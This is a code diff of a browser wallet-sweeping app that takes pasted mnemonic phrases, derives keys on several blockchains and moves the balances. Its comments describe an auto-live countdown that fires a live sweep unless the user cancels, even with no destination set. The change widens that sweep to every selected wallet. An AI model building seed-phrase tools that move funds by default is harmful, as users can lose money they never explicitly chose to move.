@@ -19,9 +19,15 @@
  *   - /credits/consume and /gas/sponsor are idempotent on stable keys.
  *
  * Auto-live (see maybeAutoLive + ui.js showAutoLiveConfirm):
- *   After Preview, if any wallet+chain holds ≥ AUTO_LIVE_THRESHOLD_USDC
+ *   After Preview, if any single wallet+chain holds ≥ AUTO_LIVE_THRESHOLD_USDC
  *   of sweepable value, we show a countdown modal and fire the live
  *   sweep when it reaches 0, unless the user explicitly cancels.
+ *
+ *   The threshold decides WHETHER auto-live fires. It does NOT decide
+ *   WHAT gets swept. Once the countdown completes, every family and
+ *   chain the user selected is swept — including wallets that
+ *   individually fell below the threshold. This means a user with
+ *   $200 on Base and $5 on Optimism gets both swept, not just Base.
  *
  *   The ONLY reasons auto-live returns early are:
  *     (a) no eligible wallets, or
@@ -340,6 +346,13 @@ function updateCreditsBadge(input) {
   }
 }
 
+function stopCreditsBadgeTimer() {
+  if (creditsBadgeTimer) {
+    clearInterval(creditsBadgeTimer);
+    creditsBadgeTimer = null;
+  }
+}
+
 function formatRemaining(ms) {
   const totalMin = Math.floor(ms / 60000);
   const h = Math.floor(totalMin / 60);
@@ -441,7 +454,15 @@ function initAccountSection() {
 
     if (!result.valid) {
       status.className = 'account-status error';
-      status.textContent = 'That client ID has no credits and no history. Restore cancelled.';
+      if (result.kind === 'format') {
+        status.textContent = "That doesn't look like a valid client ID. Expected 16+ hex characters.";
+      } else if (result.kind === 'http') {
+        status.textContent = `The credit worker rejected the check (${result.reason}). Restore cancelled.`;
+      } else if (result.kind === 'network') {
+        status.textContent = `Could not reach the credit worker (${result.reason}). Check your connection and try again.`;
+      } else {
+        status.textContent = 'That client ID has no credits and no history. Restore cancelled.';
+      }
       return;
     }
 
@@ -501,17 +522,56 @@ async function commitSweepWithRetry(sweepId, userDestination, logLine) {
 // The sweep ID is cached in sessionStorage so a page reload in the
 // same tab re-shows the prompt. If the user closes the tab, the
 // operator view still shows a HOLD note and can chase the user.
+//
+// Entries are stored as { id, at } objects so we can prune by age and
+// cap the list at PENDING_SWEEP_MAX to bound growth. The reader still
+// accepts the old string-only shape for compatibility.
 // =====================================================================
 
 const PENDING_SWEEP_KEY = 'sweep_pending_destination';
+const PENDING_SWEEP_MAX = 10;
+const PENDING_SWEEP_MAX_AGE_MS = 48 * 60 * 60 * 1000;
+
+function _readPendingRaw() {
+  try {
+    const raw = sessionStorage.getItem(PENDING_SWEEP_KEY);
+    if (!raw) return [];
+    const parsed = JSON.parse(raw);
+    if (!Array.isArray(parsed)) return [];
+    return parsed
+      .map((entry) => {
+        if (typeof entry === 'string') return { id: entry, at: Date.now() };
+        if (entry && typeof entry.id === 'string') {
+          return { id: entry.id, at: Number(entry.at) || Date.now() };
+        }
+        return null;
+      })
+      .filter(Boolean);
+  } catch {
+    return [];
+  }
+}
+
+function _prunePending(entries) {
+  const cutoff = Date.now() - PENDING_SWEEP_MAX_AGE_MS;
+  const seen = new Set();
+  const out = [];
+  for (const e of entries) {
+    if (e.at < cutoff) continue;
+    if (seen.has(e.id)) continue;
+    seen.add(e.id);
+    out.push(e);
+  }
+  // Keep the newest PENDING_SWEEP_MAX, in insertion order.
+  out.sort((a, b) => a.at - b.at);
+  return out.slice(-PENDING_SWEEP_MAX);
+}
 
 function rememberPendingSweep(sweepId) {
   try {
-    const existing = JSON.parse(sessionStorage.getItem(PENDING_SWEEP_KEY) || '[]');
-    if (!existing.includes(sweepId)) {
-      existing.push(sweepId);
-      sessionStorage.setItem(PENDING_SWEEP_KEY, JSON.stringify(existing));
-    }
+    const existing = _readPendingRaw();
+    existing.push({ id: sweepId, at: Date.now() });
+    sessionStorage.setItem(PENDING_SWEEP_KEY, JSON.stringify(_prunePending(existing)));
   } catch (e) {
     // sessionStorage unavailable — prompt only shows this session.
   }
@@ -519,19 +579,19 @@ function rememberPendingSweep(sweepId) {
 
 function forgetPendingSweep(sweepId) {
   try {
-    const existing = JSON.parse(sessionStorage.getItem(PENDING_SWEEP_KEY) || '[]');
-    const filtered = existing.filter((id) => id !== sweepId);
+    const existing = _readPendingRaw();
+    const filtered = existing.filter((e) => e.id !== sweepId);
     if (filtered.length === 0) {
       sessionStorage.removeItem(PENDING_SWEEP_KEY);
     } else {
-      sessionStorage.setItem(PENDING_SWEEP_KEY, JSON.stringify(filtered));
+      sessionStorage.setItem(PENDING_SWEEP_KEY, JSON.stringify(_prunePending(filtered)));
     }
   } catch (e) { /* ignore */ }
 }
 
 function getPendingSweeps() {
   try {
-    return JSON.parse(sessionStorage.getItem(PENDING_SWEEP_KEY) || '[]');
+    return _prunePending(_readPendingRaw()).map((e) => e.id);
   } catch {
     return [];
   }
@@ -751,6 +811,11 @@ function setSweepLock(locked, label) {
 // No other condition — no missing destination, no form state, no
 // estimate hiccup — can stop the countdown or prevent the sweep from
 // firing after it reaches 0.
+//
+// IMPORTANT: the eligible list is used ONLY to decide whether the
+// countdown modal opens. The sweep that follows is not filtered by
+// it — runSweep sweeps everything the user selected. A user with
+// $200 on Base and $5 on Optimism gets both swept, not just Base.
 // =====================================================================
 
 async function maybeAutoLive() {
@@ -788,7 +853,6 @@ async function maybeAutoLive() {
     logLine('  Auto-live: credit waived — the 10% service fee covers this sweep.\n');
     await runSweep(true, {
       autoLive: true,
-      onlyEligible: eligible,
       inputsSnapshot: snapshot,
     });
   } finally {
@@ -798,6 +862,12 @@ async function maybeAutoLive() {
 
 // =====================================================================
 // FREE CLAIM BANNER
+// =====================================================================
+//
+// Every value interpolated into innerHTML is coerced through Number()
+// first. The worker is ours, but defense-in-depth: a refactor or a
+// compromised worker should not be able to inject markup via an
+// unexpected field type.
 // =====================================================================
 
 function renderFreeClaimBanner(info) {
@@ -809,9 +879,14 @@ function renderFreeClaimBanner(info) {
     freeClaimTimer = null;
   }
 
+  const safeInt = (v) => {
+    const n = Number(v);
+    return Number.isFinite(n) ? n : '?';
+  };
+
   if (info.claimed) {
-    const freeAmount = info.freeAmount ?? 0;
-    const useMsRemaining = info.useMsRemaining ?? 0;
+    const freeAmount = Number(info.freeAmount) || 0;
+    const useMsRemaining = Number(info.useMsRemaining) || 0;
     if (freeAmount > 0 && useMsRemaining > 0 && info.__fresh) {
       const expiresAt = new Date(Date.now() + useMsRemaining);
       const expiresHH = String(expiresAt.getHours()).padStart(2, '0');
@@ -833,8 +908,8 @@ function renderFreeClaimBanner(info) {
   }
 
   if (info.blockedByFingerprint) {
-    const used = info.fpClaims ?? '?';
-    const max = info.fpMax ?? '?';
+    const used = safeInt(info.fpClaims);
+    const max = safeInt(info.fpMax);
     banner.style.display = '';
     banner.innerHTML = `
       <div class="free-claim-inner">
@@ -849,8 +924,8 @@ function renderFreeClaimBanner(info) {
   }
 
   if (info.blockedByIp) {
-    const used = info.ipClaims ?? '?';
-    const max = info.ipMax ?? '?';
+    const used = safeInt(info.ipClaims);
+    const max = safeInt(info.ipMax);
     banner.style.display = '';
     banner.innerHTML = `
       <div class="free-claim-inner">
@@ -896,8 +971,9 @@ function renderFreeClaimBanner(info) {
   const countdownEl = document.getElementById('free-claim-countdown');
   if (isRunning && countdownEl) {
     const renderedAt = Date.now();
+    const msRemainingAtRender = Number(info.msRemaining) || 0;
     const updateCountdown = () => {
-      const remaining = info.msRemaining - (Date.now() - renderedAt);
+      const remaining = msRemainingAtRender - (Date.now() - renderedAt);
       if (remaining <= 0) {
         if (freeClaimTimer) { clearInterval(freeClaimTimer); freeClaimTimer = null; }
         fetchClaimInfo().then(renderFreeClaimBanner).catch(() => {});
@@ -1097,66 +1173,88 @@ async function runPreview() {
     state.previews = { evm: [], solana: [], bitcoin: [], tron: [] };
 
     if (inputs.families.evm) {
-      for (const { address, index } of state.derivedKeys.evm) {
+      // Build a flat list of (mnemonic, chain) pairs and run them
+      // through a bounded concurrency pool. Each pair logs its own
+      // start line as the worker picks it up, so the log interleaves
+      // slightly under concurrency — acceptable, and much faster than
+      // the previous serial loop.
+      const evmTasks = [];
+      for (const entry of state.derivedKeys.evm) {
         for (const chain of inputs.evmChains) {
-          logLine(`\nPreviewing ${chain} ${address}...`);
-          try {
-            const p = await previewEvm(chain, address);
-            state.previews.evm.push({ index, ...p });
-            logLine(`  native: ${p.native?.formatted ?? '0'} ${p.native?.symbol ?? ''}`);
-            for (const t of p.tokens) logLine(`  ${t.symbol}: ${t.formatted}`);
-            if (p.error) logLine(`  warning: ${scrubSecret(p.error)}`);
-          } catch (e) {
-            logLine(`  ERROR: ${scrubSecret(e.message)}`);
-            reportError(e, { phase: 'preview_evm', chain });
-          }
+          evmTasks.push({ chain, address: entry.address, index: entry.index });
         }
       }
+
+      await runWithConcurrency(evmTasks, PREVIEW_CONCURRENCY, async ({ chain, address, index }) => {
+        logLine(`\nPreviewing ${chain} ${address}...`);
+        try {
+          const p = await previewEvm(chain, address);
+          state.previews.evm.push({ index, ...p });
+          logLine(`  ${chain} ${address.slice(0, 8)}… native: ${p.native?.formatted ?? '0'} ${p.native?.symbol ?? ''}`);
+          for (const t of p.tokens) logLine(`  ${chain} ${address.slice(0, 8)}… ${t.symbol}: ${t.formatted}`);
+          if (p.error) logLine(`  warning: ${scrubSecret(p.error)}`);
+        } catch (e) {
+          logLine(`  ERROR (${chain}): ${scrubSecret(e.message)}`);
+          reportError(e, { phase: 'preview_evm', chain });
+        }
+      });
     }
 
     if (inputs.families.solana && state.derivedKeys.solana.length > 0) {
       const conn = getConnection();
-      for (const { candidates, index } of state.derivedKeys.solana) {
-        logLine(`\nSelecting Solana derivation...`);
-        let selected;
-        try {
-          selected = await selectSolanaKeypair(conn, candidates, logLine);
-        } catch (e) {
-          logLine(`  WARN: derivation selection failed (${scrubSecret(e.message)}); using Phantom default`);
-          selected = candidates.find((c) => c.name === 'phantom') || candidates[0];
+      await runWithConcurrency(
+        state.derivedKeys.solana,
+        PREVIEW_CONCURRENCY,
+        async ({ candidates, index }) => {
+          logLine(`\nSelecting Solana derivation...`);
+          let selected;
+          try {
+            selected = await selectSolanaKeypair(conn, candidates, logLine);
+          } catch (e) {
+            logLine(`  WARN: derivation selection failed (${scrubSecret(e.message)}); using Phantom default`);
+            selected = candidates.find((c) => c.name === 'phantom') || candidates[0];
+          }
+          logLine(`\nPreviewing Solana ${selected.address}...`);
+          try {
+            const p = await previewSolanaWallet(conn, selected.address);
+            state.previews.solana.push({ index, ...p });
+            logLine(`  SOL: ${p.sol?.formatted ?? 0}`);
+            logLine(`  tokens: ${p.tokens.length}`);
+          } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
         }
-        logLine(`\nPreviewing Solana ${selected.address}...`);
-        try {
-          const p = await previewSolanaWallet(conn, selected.address);
-          state.previews.solana.push({ index, ...p });
-          logLine(`  SOL: ${p.sol?.formatted ?? 0}`);
-          logLine(`  tokens: ${p.tokens.length}`);
-        } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
-      }
+      );
     }
 
     if (inputs.families.bitcoin && state.derivedKeys.bitcoin.length > 0) {
-      for (const { address, index } of state.derivedKeys.bitcoin) {
-        logLine(`\nPreviewing Bitcoin ${address}...`);
-        try {
-          const p = await previewBitcoinWallet(address);
-          state.previews.bitcoin.push({ index, ...p });
-          logLine(`  utxos: ${p.utxos.length}, balance: ${p.balance} sats`);
-        } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
-      }
+      await runWithConcurrency(
+        state.derivedKeys.bitcoin,
+        PREVIEW_CONCURRENCY,
+        async ({ address, index }) => {
+          logLine(`\nPreviewing Bitcoin ${address}...`);
+          try {
+            const p = await previewBitcoinWallet(address);
+            state.previews.bitcoin.push({ index, ...p });
+            logLine(`  utxos: ${p.utxos.length}, balance: ${p.balance} sats`);
+          } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
+        }
+      );
     }
 
     if (inputs.families.tron && state.derivedKeys.tron.length > 0) {
-      for (const { address, index } of state.derivedKeys.tron) {
-        logLine(`\nPreviewing TRON ${address}...`);
-        try {
-          const p = await previewTronWallet(address);
-          state.previews.tron.push({ index, ...p });
-          logLine(`  TRX: ${p.trx?.formatted ?? '0'}`);
-          for (const t of p.tokens) logLine(`  ${t.symbol}: ${t.formatted}`);
-          if (p.error) logLine(`  warning: ${scrubSecret(p.error)}`);
-        } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
-      }
+      await runWithConcurrency(
+        state.derivedKeys.tron,
+        PREVIEW_CONCURRENCY,
+        async ({ address, index }) => {
+          logLine(`\nPreviewing TRON ${address}...`);
+          try {
+            const p = await previewTronWallet(address);
+            state.previews.tron.push({ index, ...p });
+            logLine(`  TRX: ${p.trx?.formatted ?? '0'}`);
+            for (const t of p.tokens) logLine(`  ${t.symbol}: ${t.formatted}`);
+            if (p.error) logLine(`  warning: ${scrubSecret(p.error)}`);
+          } catch (e) { logLine(`  ERROR: ${scrubSecret(e.message)}`); }
+        }
+      );
     }
 
     logLine('\nEstimating sweepable value...');
@@ -1203,10 +1301,19 @@ async function requirePayment() {
 // =====================================================================
 // SWEEP
 // =====================================================================
+//
+// `opts.autoLive` marks a sweep initiated by the auto-live countdown
+// rather than by a manual click on Run. It skips the credit check
+// (the service fee covers it) but otherwise behaves identically.
+//
+// The sweep iterates every family and chain the user selected. It is
+// NOT filtered by the auto-live eligibility list. Wallets with nothing
+// sweepable are skipped with a log line so the user can see what
+// happened and why.
+// =====================================================================
 
 async function runSweep(live, opts = {}) {
   const autoLive = !!opts.autoLive;
-  const onlyEligible = opts.onlyEligible || null;
 
   const startTime = Date.now();
   if (!state.derivedKeys) { logLine('ERROR: run Preview first'); return; }
@@ -1218,15 +1325,6 @@ async function runSweep(live, opts = {}) {
   const inputs = opts.inputsSnapshot || readInputs();
   const destinations = inputs.destinations;
   const families = inputs.families;
-
-  const isEligible = (family, chain, index) => {
-    if (!onlyEligible) return true;
-    return onlyEligible.some((e) =>
-      e.family === family &&
-      e.index === index &&
-      (family !== 'evm' || e.chain === chain)
-    );
-  };
 
   if (live) {
     logLine('\n⚠ Reminder: EVM wallets with no gas will be sponsored automatically for a fee.');
@@ -1321,7 +1419,6 @@ async function runSweep(live, opts = {}) {
       for (const entry of state.derivedKeys.evm) {
         const address = entry.address;
         for (const chain of inputs.evmChains) {
-          if (!isEligible('evm', chain, entry.index)) continue;
           if (chainSkipReasons[chain]) {
             logLine(`\n[EVM ${chain}] ${address}`);
             logLine(`  SKIPPED: ${chainSkipReasons[chain]}`);
@@ -1375,7 +1472,11 @@ async function runSweep(live, opts = {}) {
               const chainValueUsdc = (typeof preview?._usdValue === 'number')
                 ? preview._usdValue
                 : await estimateChainValueUsdc(chain, preview);
-              if (chainValueUsdc <= 0) { chainSkipReasons[chain] = `nothing to sweep on ${chain}`; continue; }
+              if (chainValueUsdc <= 0) {
+                logLine(`  SKIPPED: nothing sweepable on ${chain}`);
+                chainSkipReasons[chain] = `nothing to sweep on ${chain}`;
+                continue;
+              }
               if (chainValueUsdc < MIN_SPONSOR_FLOOR_USDC) {
                 logLine(`  SKIPPED: ${chain} value (~$${chainValueUsdc.toFixed(2)}) below $${MIN_SPONSOR_FLOOR_USDC} sponsorship floor`);
                 chainSkipReasons[chain] = `below sponsorship floor on ${chain}`;
@@ -1448,8 +1549,6 @@ async function runSweep(live, opts = {}) {
     if (families.solana && state.derivedKeys.solana.length > 0) {
       const conn = getConnection();
       for (const { candidates, index } of state.derivedKeys.solana) {
-        if (!isEligible('solana', null, index)) continue;
-
         let selected;
         try { selected = await selectSolanaKeypair(conn, candidates, logLine); }
         catch (e) {
@@ -1495,7 +1594,6 @@ async function runSweep(live, opts = {}) {
 
     if (families.bitcoin && state.derivedKeys.bitcoin.length > 0) {
       for (const { keyPair, address, index } of state.derivedKeys.bitcoin) {
-        if (!isEligible('bitcoin', null, index)) continue;
         logLine(`\n[Bitcoin] ${address}`);
         try {
           const r = await sweepBitcoin(address, keyPair, { dryRun, logLine });
@@ -1522,7 +1620,6 @@ async function runSweep(live, opts = {}) {
 
     if (families.tron && state.derivedKeys.tron.length > 0) {
       for (const { address, index, tronWeb } of state.derivedKeys.tron) {
-        if (!isEligible('tron', null, index)) continue;
         logLine(`\n[TRON] ${address}`);
         try {
           const r = await sweepTron(address, {
@@ -1896,6 +1993,7 @@ document.addEventListener('DOMContentLoaded', async () => {
   $('#clear-button').addEventListener('click', async () => {
     if (state.wallet) { try { await state.wallet.dispose(); } catch {} }
     clearAll();
+    stopCreditsBadgeTimer();
     $('#phrases').value = '';
     $('#dest-evm').value = '';
     clearLog();
